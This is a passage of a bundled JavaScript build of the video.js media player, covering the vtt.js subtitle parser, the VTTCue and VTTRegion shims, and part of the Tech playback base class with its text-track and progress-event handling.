          self.cue.text += line;
          continue;
        case "BADCUE": // BADCUE
          // 54-62 - Collect and discard the remaining cue.
          if (!line) {
            self.state = "ID";
          }
          continue;
        }
      }
    } catch (e) {
      self.reportOrThrowError(e);

      // If we are currently parsing a cue, report what we have.
      if (self.state === "CUETEXT" && self.cue && self.oncue) {
        self.oncue(self.cue);
      }
      self.cue = null;
      // Enter BADWEBVTT state if header was not parsed correctly otherwise
      // another exception occurred so enter BADCUE state.
      self.state = self.state === "INITIAL" ? "BADWEBVTT" : "BADCUE";
    }
    return this;
  },
  flush: function () {
    var self = this;
    try {
      // Finish decoding the stream.
      self.buffer += self.decoder.decode();
      // Synthesize the end of the current cue or region.
      if (self.cue || self.state === "HEADER") {
        self.buffer += "\n\n";
        self.parse();
      }
      // If we've flushed, parsed, and we're still on the INITIAL state then
      // that means we don't have enough of the stream to parse the first
      // line.
      if (self.state === "INITIAL") {
        throw new ParsingError(ParsingError.Errors.BadSignature);
      }
    } catch(e) {
      self.reportOrThrowError(e);
    }
    self.onflush && self.onflush();
    return this;
  }
};

var vtt$1 = WebVTT$1;

/**
 * Copyright 2013 vtt.js Contributors
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

var autoKeyword = "auto";
var directionSetting = {
  "": true,
  "lr": true,
  "rl": true
};
var alignSetting = {
  "start": true,
  "middle": true,
  "end": true,
  "left": true,
  "right": true
};

function findDirectionSetting(value) {
  if (typeof value !== "string") {
    return false;
  }
  var dir = directionSetting[value.toLowerCase()];
  return dir ? value.toLowerCase() : false;
}

function findAlignSetting(value) {
  if (typeof value !== "string") {
    return false;
  }
  var align = alignSetting[value.toLowerCase()];
  return align ? value.toLowerCase() : false;
}

function extend$1(obj) {
  var i = 1;
  for (; i < arguments.length; i++) {
    var cobj = arguments[i];
    for (var p in cobj) {
      obj[p] = cobj[p];
    }
  }

  return obj;
}

function VTTCue(startTime, endTime, text) {
  var cue = this;
  var isIE8 = (/MSIE\s8\.0/).test(navigator.userAgent);
  var baseObj = {};

  if (isIE8) {
    cue = document.createElement('custom');
  } else {
    baseObj.enumerable = true;
  }

  /**
   * Shim implementation specific properties. These properties are not in
   * the spec.
   */

  // Lets us know when the VTTCue's data has changed in such a way that we need
  // to recompute its display state. This lets us compute its display state
  // lazily.
  cue.hasBeenReset = false;

  /**
   * VTTCue and TextTrackCue properties
   * http://dev.w3.org/html5/webvtt/#vttcue-interface
   */

  var _id = "";
  var _pauseOnExit = false;
  var _startTime = startTime;
  var _endTime = endTime;
  var _text = text;
  var _region = null;
  var _vertical = "";
  var _snapToLines = true;
  var _line = "auto";
  var _lineAlign = "start";
  var _position = 50;
  var _positionAlign = "middle";
  var _size = 50;
  var _align = "middle";

  Object.defineProperty(cue,
    "id", extend$1({}, baseObj, {
      get: function() {
        return _id;
      },
      set: function(value) {
        _id = "" + value;
      }
    }));

  Object.defineProperty(cue,
    "pauseOnExit", extend$1({}, baseObj, {
      get: function() {
        return _pauseOnExit;
      },
      set: function(value) {
        _pauseOnExit = !!value;
      }
    }));

  Object.defineProperty(cue,
    "startTime", extend$1({}, baseObj, {
      get: function() {
        return _startTime;
      },
      set: function(value) {
        if (typeof value !== "number") {
          throw new TypeError("Start time must be set to a number.");
        }
        _startTime = value;
        this.hasBeenReset = true;
      }
    }));

  Object.defineProperty(cue,
    "endTime", extend$1({}, baseObj, {
      get: function() {
        return _endTime;
      },
      set: function(value) {
        if (typeof value !== "number") {
          throw new TypeError("End time must be set to a number.");
        }
        _endTime = value;
        this.hasBeenReset = true;
      }
    }));

  Object.defineProperty(cue,
    "text", extend$1({}, baseObj, {
      get: function() {
        return _text;
      },
      set: function(value) {
        _text = "" + value;
        this.hasBeenReset = true;
      }
    }));

  Object.defineProperty(cue,
    "region", extend$1({}, baseObj, {
      get: function() {
        return _region;
      },
      set: function(value) {
        _region = value;
        this.hasBeenReset = true;
      }
    }));

  Object.defineProperty(cue,
    "vertical", extend$1({}, baseObj, {
      get: function() {
        return _vertical;
      },
      set: function(value) {
        var setting = findDirectionSetting(value);
        // Have to check for false because the setting an be an empty string.
        if (setting === false) {
          throw new SyntaxError("An invalid or illegal string was specified.");
        }
        _vertical = setting;
        this.hasBeenReset = true;
      }
    }));

  Object.defineProperty(cue,
    "snapToLines", extend$1({}, baseObj, {
      get: function() {
        return _snapToLines;
      },
      set: function(value) {
        _snapToLines = !!value;
        this.hasBeenReset = true;
      }
    }));

  Object.defineProperty(cue,
    "line", extend$1({}, baseObj, {
      get: function() {
        return _line;
      },
      set: function(value) {
        if (typeof value !== "number" && value !== autoKeyword) {
          throw new SyntaxError("An invalid number or illegal string was specified.");
        }
        _line = value;
        this.hasBeenReset = true;
      }
    }));

  Object.defineProperty(cue,
    "lineAlign", extend$1({}, baseObj, {
      get: function() {
        return _lineAlign;
      },
      set: function(value) {
        var setting = findAlignSetting(value);
        if (!setting) {
          throw new SyntaxError("An invalid or illegal string was specified.");
        }
        _lineAlign = setting;
        this.hasBeenReset = true;
      }
    }));

  Object.defineProperty(cue,
    "position", extend$1({}, baseObj, {
      get: function() {
        return _position;
      },
      set: function(value) {
        if (value < 0 || value > 100) {
          throw new Error("Position must be between 0 and 100.");
        }
        _position = value;
        this.hasBeenReset = true;
      }
    }));

  Object.defineProperty(cue,
    "positionAlign", extend$1({}, baseObj, {
      get: function() {
        return _positionAlign;
      },
      set: function(value) {
        var setting = findAlignSetting(value);
        if (!setting) {
          throw new SyntaxError("An invalid or illegal string was specified.");
        }
        _positionAlign = setting;
        this.hasBeenReset = true;
      }
    }));

  Object.defineProperty(cue,
    "size", extend$1({}, baseObj, {
      get: function() {
        return _size;
      },
      set: function(value) {
        if (value < 0 || value > 100) {
          throw new Error("Size must be between 0 and 100.");
        }
        _size = value;
        this.hasBeenReset = true;
      }
    }));

  Object.defineProperty(cue,
    "align", extend$1({}, baseObj, {
      get: function() {
        return _align;
      },
      set: function(value) {
        var setting = findAlignSetting(value);
        if (!setting) {
          throw new SyntaxError("An invalid or illegal string was specified.");
        }
        _align = setting;
        this.hasBeenReset = true;
      }
    }));

  /**
   * Other <track> spec defined properties
   */

  // http://www.whatwg.org/specs/web-apps/current-work/multipage/the-video-element.html#text-track-cue-display-state
  cue.displayState = undefined;

  if (isIE8) {
    return cue;
  }
}

/**
 * VTTCue methods
 */

VTTCue.prototype.getCueAsHTML = function() {
  // Assume WebVTT.convertCueToDOMTree is on the global.
  return WebVTT.convertCueToDOMTree(window, this.text);
};

var vttcue = VTTCue;

/**
 * Copyright 2013 vtt.js Contributors
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

var scrollSetting = {
  "": true,
  "up": true
};

function findScrollSetting(value) {
  if (typeof value !== "string") {
    return false;
  }
  var scroll = scrollSetting[value.toLowerCase()];
  return scroll ? value.toLowerCase() : false;
}

function isValidPercentValue(value) {
  return typeof value === "number" && (value >= 0 && value <= 100);
}

// VTTRegion shim http://dev.w3.org/html5/webvtt/#vttregion-interface
function VTTRegion() {
  var _width = 100;
  var _lines = 3;
  var _regionAnchorX = 0;
  var _regionAnchorY = 100;
  var _viewportAnchorX = 0;
  var _viewportAnchorY = 100;
  var _scroll = "";

  Object.defineProperties(this, {
    "width": {
      enumerable: true,
      get: function() {
        return _width;
      },
      set: function(value) {
        if (!isValidPercentValue(value)) {
          throw new Error("Width must be between 0 and 100.");
        }
        _width = value;
      }
    },
    "lines": {
      enumerable: true,
      get: function() {
        return _lines;
      },
      set: function(value) {
        if (typeof value !== "number") {
          throw new TypeError("Lines must be set to a number.");
        }
        _lines = value;
      }
    },
    "regionAnchorY": {
      enumerable: true,
      get: function() {
        return _regionAnchorY;
      },
      set: function(value) {
        if (!isValidPercentValue(value)) {
          throw new Error("RegionAnchorX must be between 0 and 100.");
        }
        _regionAnchorY = value;
      }
    },
    "regionAnchorX": {
      enumerable: true,
      get: function() {
        return _regionAnchorX;
      },
      set: function(value) {
        if(!isValidPercentValue(value)) {
          throw new Error("RegionAnchorY must be between 0 and 100.");
        }
        _regionAnchorX = value;
      }
    },
    "viewportAnchorY": {
      enumerable: true,
      get: function() {
        return _viewportAnchorY;
      },
      set: function(value) {
        if (!isValidPercentValue(value)) {
          throw new Error("ViewportAnchorY must be between 0 and 100.");
        }
        _viewportAnchorY = value;
      }
    },
    "viewportAnchorX": {
      enumerable: true,
      get: function() {
        return _viewportAnchorX;
      },
      set: function(value) {
        if (!isValidPercentValue(value)) {
          throw new Error("ViewportAnchorX must be between 0 and 100.");
        }
        _viewportAnchorX = value;
      }
    },
    "scroll": {
      enumerable: true,
      get: function() {
        return _scroll;
      },
      set: function(value) {
        var setting = findScrollSetting(value);
        // Have to check for false as an empty string is a legal value.
        if (setting === false) {
          throw new SyntaxError("An invalid or illegal string was specified.");
        }
        _scroll = setting;
      }
    }
  });
}

var vttregion = VTTRegion;

var browserIndex = createCommonjsModule(function (module) {
/**
 * Copyright 2013 vtt.js Contributors
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

// Default exports for Node. Export the extended versions of VTTCue and
// VTTRegion in Node since we likely want the capability to convert back and
// forth between JSON. If we don't then it's not that big of a deal since we're
// off browser.



var vttjs = module.exports = {
  WebVTT: vtt$1,
  VTTCue: vttcue,
  VTTRegion: vttregion
};

window_1.vttjs = vttjs;
window_1.WebVTT = vttjs.WebVTT;

var cueShim = vttjs.VTTCue;
var regionShim = vttjs.VTTRegion;
var nativeVTTCue = window_1.VTTCue;
var nativeVTTRegion = window_1.VTTRegion;

vttjs.shim = function() {
  window_1.VTTCue = cueShim;
  window_1.VTTRegion = regionShim;
};

vttjs.restore = function() {
  window_1.VTTCue = nativeVTTCue;
  window_1.VTTRegion = nativeVTTRegion;
};

if (!window_1.VTTCue) {
  vttjs.shim();
}
});

/**
 * @file tech.js
 */

/**
 * An Object containing a structure like: `{src: 'url', type: 'mimetype'}` or string
 * that just contains the src url alone.
 * * `var SourceObject = {src: 'http://ex.com/video.mp4', type: 'video/mp4'};`
   * `var SourceString = 'http://example.com/some-video.mp4';`
 *
 * @typedef {Object|string} Tech~SourceObject
 *
 * @property {string} src
 *           The url to the source
 *
 * @property {string} type
 *           The mime type of the source
 */

/**
 * A function used by {@link Tech} to create a new {@link TextTrack}.
 *
 * @private
 *
 * @param {Tech} self
 *        An instance of the Tech class.
 *
 * @param {string} kind
 *        `TextTrack` kind (subtitles, captions, descriptions, chapters, or metadata)
 *
 * @param {string} [label]
 *        Label to identify the text track
 *
 * @param {string} [language]
 *        Two letter language abbreviation
 *
 * @param {Object} [options={}]
 *        An object with additional text track options
 *
 * @return {TextTrack}
 *          The text track that was created.
 */
function createTrackHelper(self, kind, label, language) {
  var options = arguments.length > 4 && arguments[4] !== undefined ? arguments[4] : {};

  var tracks = self.textTracks();

  options.kind = kind;

  if (label) {
    options.label = label;
  }
  if (language) {
    options.language = language;
  }
  options.tech = self;

  var track = new ALL.text.TrackClass(options);

  tracks.addTrack(track);

  return track;
}

/**
 * This is the base class for media playback technology controllers, such as
 * {@link Flash} and {@link HTML5}
 *
 * @extends Component
 */

var Tech = function (_Component) {
  inherits(Tech, _Component);

  /**
   * Create an instance of this Tech.
   *
   * @param {Object} [options]
   *        The key/value store of player options.
   *
   * @param {Component~ReadyCallback} ready
   *        Callback function to call when the `HTML5` Tech is ready.
   */
  function Tech() {
    var options = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};
    var ready = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : function () {};
    classCallCheck(this, Tech);

    // we don't want the tech to report user activity automatically.
    // This is done manually in addControlsListeners
    options.reportTouchActivity = false;

    // keep track of whether the current source has played at all to
    // implement a very limited played()
    var _this = possibleConstructorReturn(this, _Component.call(this, null, options, ready));

    _this.hasStarted_ = false;
    _this.on('playing', function () {
      this.hasStarted_ = true;
    });
    _this.on('loadstart', function () {
      this.hasStarted_ = false;
    });

    ALL.names.forEach(function (name) {
      var props = ALL[name];

      if (options && options[props.getterName]) {
        _this[props.privateName] = options[props.getterName];
      }
    });

    // Manually track progress in cases where the browser/flash player doesn't report it.
    if (!_this.featuresProgressEvents) {
      _this.manualProgressOn();
    }

    // Manually track timeupdates in cases where the browser/flash player doesn't report it.
    if (!_this.featuresTimeupdateEvents) {
      _this.manualTimeUpdatesOn();
    }

    ['Text', 'Audio', 'Video'].forEach(function (track) {
      if (options['native' + track + 'Tracks'] === false) {
        _this['featuresNative' + track + 'Tracks'] = false;
      }
    });

    if (options.nativeCaptions === false || options.nativeTextTracks === false) {
      _this.featuresNativeTextTracks = false;
    } else if (options.nativeCaptions === true || options.nativeTextTracks === true) {
      _this.featuresNativeTextTracks = true;
    }

    if (!_this.featuresNativeTextTracks) {
      _this.emulateTextTracks();
    }

    _this.autoRemoteTextTracks_ = new ALL.text.ListClass();

    _this.initTrackListeners();

    // Turn on component tap events only if not using native controls
    if (!options.nativeControlsForTouch) {
      _this.emitTapEvents();
    }

    if (_this.constructor) {
      _this.name_ = _this.constructor.name || 'Unknown Tech';
    }
    return _this;
  }

  /**
   * A special function to trigger source set in a way that will allow player
   * to re-trigger if the player or tech are not ready yet.
   *
   * @fires Tech#sourceset
   * @param {string} src The source string at the time of the source changing.
   */


  Tech.prototype.triggerSourceset = function triggerSourceset(src) {
    var _this2 = this;

    if (!this.isReady_) {
      // on initial ready we have to trigger source set
      // 1ms after ready so that player can watch for it.
      this.one('ready', function () {
        return _this2.setTimeout(function () {
          return _this2.triggerSourceset(src);
        }, 1);
      });
    }

    /**
     * Fired when the source is set on the tech causing the media element
     * to reload.
     *
     * @see {@link Player#event:sourceset}
     * @event Tech#sourceset
     * @type {EventTarget~Event}
     */
    this.trigger({
      src: src,
      type: 'sourceset'
    });
  };

  /* Fallbacks for unsupported event types
  ================================================================================ */

  /**
   * Polyfill the `progress` event for browsers that don't support it natively.
   *
   * @see {@link Tech#trackProgress}
   */


  Tech.prototype.manualProgressOn = function manualProgressOn() {
    this.on('durationchange', this.onDurationChange);

    this.manualProgress = true;

    // Trigger progress watching when a source begins loading
    this.one('ready', this.trackProgress);
  };

  /**
   * Turn off the polyfill for `progress` events that was created in
   * {@link Tech#manualProgressOn}
   */


  Tech.prototype.manualProgressOff = function manualProgressOff() {
    this.manualProgress = false;
    this.stopTrackingProgress();

    this.off('durationchange', this.onDurationChange);
  };

  /**
   * This is used to trigger a `progress` event when the buffered percent changes. It
   * sets an interval function that will be called every 500 milliseconds to check if the
   * buffer end percent has changed.
   *
   * > This function is called by {@link Tech#manualProgressOn}
   *
   * @param {EventTarget~Event} event
   *        The `ready` event that caused this to run.
   *
   * @listens Tech#ready
   * @fires Tech#progress
   */


  Tech.prototype.trackProgress = function trackProgress(event) {
    this.stopTrackingProgress();
    this.progressInterval = this.setInterval(bind(this, function () {
      // Don't trigger unless buffered amount is greater than last time

      var numBufferedPercent = this.bufferedPercent();

      if (this.bufferedPercent_ !== numBufferedPercent) {
        /**
         * See {@link Player#progress}
         *
         * @event Tech#progress
         * @type {EventTarget~Event}
         */
        this.trigger('progress');
      }

      this.bufferedPercent_ = numBufferedPercent;

      if (numBufferedPercent === 1) {
        this.stopTrackingProgress();
      }
    }), 500);
  };

  /**
   * Update our internal duration on a `durationchange` event by calling
   * {@link Tech#duration}.
   *
   * @param {EventTarget~Event} event
   *        The `durationchange` event that caused this to run.
   *
   * @listens Tech#durationchange
   */


  Tech.prototype.onDurationChange = function onDurationChange(event) {
    this.duration_ = this.duration();
  };

  /**
   * Get and create a `TimeRange` object for buffering.
   *
   * @return {TimeRange}
   *         The time range object that was created.
   */


  Tech.prototype.buffered = function buffered() {
    return createTimeRanges(0, 0);
  };

  /**
   * Get the percentage of the current video that is currently buffered.
   *
   * @return {number}
   *         A number from 0 to 1 that represents the decimal percentage of the
   *         video that is buffered.
   *
   */


  Tech.prototype.bufferedPercent = function bufferedPercent$$1() {
    return bufferedPercent(this.buffered(), this.duration_);
  };

  /**
   * Turn off the polyfill for `progress` events that was created in
   * {@link Tech#manualProgressOn}
   * Stop manually tracking progress events by clearing the interval that was set in
   * {@link Tech#trackProgress}.
   */


  Tech.prototype.stopTrackingProgress = function stopTrackingProgress() {
    this.clearInterval(this.progressInterval);
  };

  /**
   * Polyfill the `timeupdate` event for browsers that don't support it.
   *
   * @see {@link Tech#trackCurrentTime}
   */


  Tech.prototype.manualTimeUpdatesOn = function manualTimeUpdatesOn() {
    this.manualTimeUpdates = true;

    this.on('play', this.trackCurrentTime);
    this.on('pause', this.stopTrackingCurrentTime);
  };

  /**
   * Turn off the polyfill for `timeupdate` events that was created in
   * {@link Tech#manualTimeUpdatesOn}
   */


  Tech.prototype.manualTimeUpdatesOff = function manualTimeUpdatesOff() {
    this.manualTimeUpdates = false;
    this.stopTrackingCurrentTime();
    this.off('play', this.trackCurrentTime);
    this.off('pause', this.stopTrackingCurrentTime);
  };

  /**
   * Sets up an interval function to track current time and trigger `timeupdate` every
   * 250 milliseconds.
   *
   * @listens Tech#play
   * @triggers Tech#timeupdate
   */


  Tech.prototype.trackCurrentTime = function trackCurrentTime() {
    if (this.currentTimeInterval) {
      this.stopTrackingCurrentTime();
    }
    this.currentTimeInterval = this.setInterval(function () {
      /**
       * Triggered at an interval of 250ms to indicated that time is passing in the video.
       *
       * @event Tech#timeupdate
       * @type {EventTarget~Event}
       */
      this.trigger({ type: 'timeupdate', target: this, manuallyTriggered: true });

      // 42 = 24 fps // 250 is what Webkit uses // FF uses 15
    }, 250);
  };

  /**
   * Stop the interval function created in {@link Tech#trackCurrentTime} so that the
   * `timeupdate` event is no longer triggered.
   *
   * @listens {Tech#pause}
   */


  Tech.prototype.stopTrackingCurrentTime = function stopTrackingCurrentTime() {
    this.clearInterval(this.currentTimeInterval);

    // #1002 - if the video ends right before the next timeupdate would happen,
    // the progress bar won't make it all the way to the end
    this.trigger({ type: 'timeupdate', target: this, manuallyTriggered: true });
  };

  /**
   * Turn off all event polyfills, clear the `Tech`s {@link AudioTrackList},
   * {@link VideoTrackList}, and {@link TextTrackList}, and dispose of this Tech.
   *
   * @fires Component#dispose
   */


  Tech.prototype.dispose = function dispose() {

    // clear out all tracks because we can't reuse them between techs
    this.clearTracks(NORMAL.names);

    // Turn off any manual progress or timeupdate tracking
    if (this.manualProgress) {
      this.manualProgressOff();
    }

    if (this.manualTimeUpdates) {
      this.manualTimeUpdatesOff();
    }

    _Component.prototype.dispose.call(this);
  };

  /**
   * Clear out a single `TrackList` or an array of `TrackLists` given their names.
   *
   * > Note: Techs without source handlers should call this between sources for `video`
   *         & `audio` tracks. You don't want to use them between tracks!
   *
   * @param {string[]|string} types
   *        TrackList names to clear, valid names are `video`, `audio`, and
   *        `text`.
   */


  Tech.prototype.clearTracks = function clearTracks(types) {
    var _this3 = this;

    types = [].concat(types);
    // clear out all tracks because we can't reuse them between techs
    types.forEach(function (type) {
      var list = _this3[type + 'Tracks']() || [];
      var i = list.length;

      while (i--) {
        var track = list[i];

        if (type === 'text') {
          _this3.removeRemoteTextTrack(track);
        }
        list.removeTrack(track);
      }
    });
  };

  /**
   * Remove any TextTracks added via addRemoteTextTrack that are
   * flagged for automatic garbage collection
   */


  Tech.prototype.cleanupAutoTextTracks = function cleanupAutoTextTracks() {
    var list = this.autoRemoteTextTracks_ || [];
    var i = list.length;

    while (i--) {
      var track = list[i];

      this.removeRemoteTextTrack(track);
    }
  };

  /**
   * Reset the tech, which will removes all sources and reset the internal readyState.
   *
   * @abstract
   */


  Tech.prototype.reset = function reset() {};

  /**
   * Get or set an error on the Tech.
   *
   * @param {MediaError} [err]
   *        Error to set on the Tech
   *
   * @return {MediaError|null}
   *         The current error object on the tech, or null if there isn't one.
   */


  Tech.prototype.error = function error(err) {
    if (err !== undefined) {
      this.error_ = new MediaError(err);
      this.trigger('error');
    }
    return this.error_;
  };

  /**
   * Returns the `TimeRange`s that have been played through for the current source.
   *
   * > NOTE: This implementation is incomplete. It does not track the played `TimeRange`.
   *         It only checks wether the source has played at all or not.
   *
   * @return {TimeRange}
   *         - A single time range if this video has played
   *         - An empty set of ranges if not.
   */


  Tech.prototype.played = function played() {
    if (this.hasStarted_) {
      return createTimeRanges(0, 0);
    }
    return createTimeRanges();
  };

  /**
   * Causes a manual time update to occur if {@link Tech#manualTimeUpdatesOn} was
   * previously called.
   *
   * @fires Tech#timeupdate
   */


  Tech.prototype.setCurrentTime = function setCurrentTime() {
    // improve the accuracy of manual timeupdates
    if (this.manualTimeUpdates) {
      /**
       * A manual `timeupdate` event.
       *
       * @event Tech#timeupdate
       * @type {EventTarget~Event}
       */
      this.trigger({ type: 'timeupdate', target: this, manuallyTriggered: true });
    }
  };

  /**
   * Turn on listeners for {@link VideoTrackList}, {@link {AudioTrackList}, and
   * {@link TextTrackList} events.
   *
   * This adds {@link EventTarget~EventListeners} for `addtrack`, and  `removetrack`.
   *
   * @fires Tech#audiotrackchange
   * @fires Tech#videotrackchange
   * @fires Tech#texttrackchange
   */


  Tech.prototype.initTrackListeners = function initTrackListeners() {
    var _this4 = this;

    /**
     * Triggered when tracks are added or removed on the Tech {@link AudioTrackList}
     *
     * @event Tech#audiotrackchange
     * @type {EventTarget~Event}
     */

    /**
     * Triggered when tracks are added or removed on the Tech {@link VideoTrackList}
     *
     * @event Tech#videotrackchange
     * @type {EventTarget~Event}
     */

    /**
     * Triggered when tracks are added or removed on the Tech {@link TextTrackList}
     *
     * @event Tech#texttrackchange
     * @type {EventTarget~Event}
     */
    NORMAL.names.forEach(function (name) {
      var props = NORMAL[name];
      var trackListChanges = function trackListChanges() {
        _this4.trigger(name + 'trackchange');
      };

      var tracks = _this4[props.getterName]();

      tracks.addEventListener('removetrack', trackListChanges);
      tracks.addEventListener('addtrack', trackListChanges);

      _this4.on('dispose', function () {
        tracks.removeEventListener('removetrack', trackListChanges);
        tracks.removeEventListener('addtrack', trackListChanges);
      });
    });
  };

  /**
   * Emulate TextTracks using vtt.js if necessary
   *
   * @fires Tech#vttjsloaded
   * @fires Tech#vttjserror
   */


  Tech.prototype.addWebVttScript_ = function addWebVttScript_() {
    var _this5 = this;

    if (window_1.WebVTT) {
      return;
    }

    // Initially, Tech.el_ is a child of a dummy-div wait until the Component system
    // signals that the Tech is ready at which point Tech.el_ is part of the DOM
    // before inserting the WebVTT script
    if (document_1.body.contains(this.el())) {

      // load via require if available and vtt.js script location was not passed in
      // as an option. novtt builds will turn the above require call into an empty object
      // which will cause this if check to always fail.
      if (!this.options_['vtt.js'] && isPlain(browserIndex) && Object.keys(browserIndex).length > 0) {
        this.trigger('vttjsloaded');
        return;
      }

      // load vtt.js via the script location option or the cdn of no location was
      // passed in
      var script = document_1.createElement('script');

      script.src = this.options_['vtt.js'] || 'https://vjs.zencdn.net/vttjs/0.12.4/vtt.min.js';
      script.onload = function () {
        /**
         * Fired when vtt.js is loaded.
         *
         * @event Tech#vttjsloaded
         * @type {EventTarget~Event}
         */
        _this5.trigger('vttjsloaded');
      };
      script.onerror = function () {
        /**
         * Fired when vtt.js was not loaded due to an error
         *
         * @event Tech#vttjsloaded
         * @type {EventTarget~Event}
         */
        _this5.trigger('vttjserror');
      };
      this.on('dispose', function () {
        script.onload = null;
        script.onerror = null;
      });
      // but have not loaded yet and we set it to true before the inject so that
      // we don't overwrite the injected window.WebVTT if it loads right away
      window_1.WebVTT = true;
      this.el().parentNode.appendChild(script);
    } else {
      this.ready(this.addWebVttScript_);
    }
  };

  /**
   * Emulate texttracks
   *
   */


  Tech.prototype.emulateTextTracks = function emulateTextTracks() {
    var _this6 = this;

    var tracks = this.textTracks();
    var remoteTracks = this.remoteTextTracks();
    var handleAddTrack = function handleAddTrack(e) {
      return tracks.addTrack(e.track);
    };
    var handleRemoveTrack = function handleRemoveTrack(e) {
      return tracks.removeTrack(e.track);
    };

    remoteTracks.on('addtrack', handleAddTrack);
    remoteTracks.on('removetrack', handleRemoveTrack);

    this.addWebVttScript_();

    var updateDisplay = function updateDisplay() {
      return _this6.trigger('texttrackchange');
    };

    var textTracksChanges = function textTracksChanges() {
      updateDisplay();

      for (var i = 0; i < tracks.length; i++) {
        var track = tracks[i];

        track.removeEventListener('cuechange', updateDisplay);
        if (track.mode === 'showing') {
          track.addEventListener('cuechange', updateDisplay);
        }
      }
    };

    textTracksChanges();
    tracks.addEventListener('change', textTracksChanges);
    tracks.addEventListener('addtrack', textTracksChanges);
    tracks.addEventListener('removetrack', textTracksChanges);

    this.on('dispose', function () {
      remoteTracks.off('addtrack', handleAddTrack);
      remoteTracks.off('removetrack', handleRemoveTrack);
      tracks.removeEventListener('change', textTracksChanges);
      tracks.removeEventListener('addtrack', textTracksChanges);
      tracks.removeEventListener('removetrack', textTracksChanges);

      for (var i = 0; i < tracks.length; i++) {
        var track = tracks[i];

        track.removeEventListener('cuechange', updateDisplay);
      }
    });
  };

  /**
   * Create and returns a remote {@link TextTrack} object.
   *
   * @param {string} kind
   *        `TextTrack` kind (subtitles, captions, descriptions, chapters, or metadata)
   *
   * @param {string} [label]
   *        Label to identify the text track
   *
   * @param {string} [language]
   *        Two letter language abbreviation
   *
   * @return {TextTrack}
   *         The TextTrack that gets created.
   */


  Tech.prototype.addTextTrack = function addTextTrack(kind, label, language) {
    if (!kind) {
      throw new Error('TextTrack kind is required but was not provided');
    }

    return createTrackHelper(this, kind, label, language);
  };

  /**
   * Create an emulated TextTrack for use by addRemoteTextTrack
   *
   * This is intended to be overridden by classes that inherit from
   * Tech in order to create native or custom TextTracks.
   *
   * @param {Object} options
   *        The object should contain the options to initialize the TextTrack with.
   *
   * @param {string} [options.kind]
   *        `TextTrack` kind (subtitles, captions, descriptions, chapters, or metadata).
   *
   * @param {string} [options.label].
   *        Label to identify the text track
   *
   * @param {string} [options.language]
   *        Two letter language abbreviation.
   *
   * @return {HTMLTrackElement}
   *         The track element that gets created.
   */


  Tech.prototype.createRemoteTextTrack = function createRemoteTextTrack(options) {
    var track = mergeOptions(options, {
      tech: this
    });

    return new REMOTE.remoteTextEl.TrackClass(track);
  };

  /**
   * Creates a remote text track object and returns an html track element.
   *
   * > Note: This can be an emulated {@link HTMLTrackElement} or a native one.
   *
   * @param {Object} options
   *        See {@link Tech#createRemoteTextTrack} for more detailed properties.
   *
   * @param {boolean} [manualCleanup=true]
   *        - When false: the TextTrack will be automatically removed from the video
   *          element whenever the source changes
   *        - When True: The TextTrack will have to be cleaned up manually
   *
   * @return {HTMLTrackElement}
   *         An Html Track Element.
   *
   * @deprecated The default functionality for this function will be equivalent
   *             to "manualCleanup=false" in the future. The manualCleanup parameter will
   *             also be removed.
   */


  Tech.prototype.addRemoteTextTrack = function addRemoteTextTrack() {
    var _this7 = this;

    var options = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};
    var manualCleanup = arguments[1];

    var htmlTrackElement = this.createRemoteTextTrack(options);

    if (manualCleanup !== true && manualCleanup !== false) {
      // deprecation warning
      log$1.warn('Calling addRemoteTextTrack without explicitly setting the "manualCleanup" parameter to `true` is deprecated and default to `false` in future version of video.js');
      manualCleanup = true;
    }

    // store HTMLTrackElement and TextTrack to remote list
    this.remoteTextTrackEls().addTrackElement_(htmlTrackElement);
    this.remoteTextTracks().addTrack(htmlTrackElement.track);

    if (manualCleanup !== true) {
      // create the TextTrackList if it doesn't exist
      this.ready(function () {
        return _this7.autoRemoteTextTracks_.addTrack(htmlTrackElement.track);
      });
    }

    return htmlTrackElement;
  };

  /**
   * Remove a remote text track from the remote `TextTrackList`.
   *
   * @param {TextTrack} track
   *        `TextTrack` to remove from the `TextTrackList`
   */


  Tech.prototype.removeRemoteTextTrack = function removeRemoteTextTrack(track) {
    var trackElement = this.remoteTextTrackEls().getTrackElementByTrack_(track);

    // remove HTMLTrackElement and TextTrack from remote list
    this.remoteTextTrackEls().removeTrackElement_(trackElement);
    this.remoteTextTracks().removeTrack(track);
    this.autoRemoteTextTracks_.removeTrack(track);
  };

  /**
   * Gets available media playback quality metrics as specified by the W3C's Media
   * Playback Quality API.
   *
   * @see [Spec]{@link https://wicg.github.io/media-playback-quality}
   *
   * @return {Object}
   *         An object with supported media playback quality metrics
   *
   * @abstract
   */


  Tech.prototype.getVideoPlaybackQuality = function getVideoPlaybackQuality() {
    return {};
  };

  /**
   * A method to set a poster from a `Tech`.
   *
   * @abstract
   */


  Tech.prototype.setPoster = function setPoster() {};

  /**
   * A method to check for the presence of the 'playsinine' <video> attribute.
   *
   * @abstract
   */


  Tech.prototype.playsinline = function playsinline() {};

  /**
   * A method to set or unset the 'playsinine' <video> attribute.
   *
   * @abstract
   */


  Tech.prototype.setPlaysinline = function setPlaysinline() {};

  /*
   * Check if the tech can support the given mime-type.
   *
   * The base tech does not support any type, but source handlers might
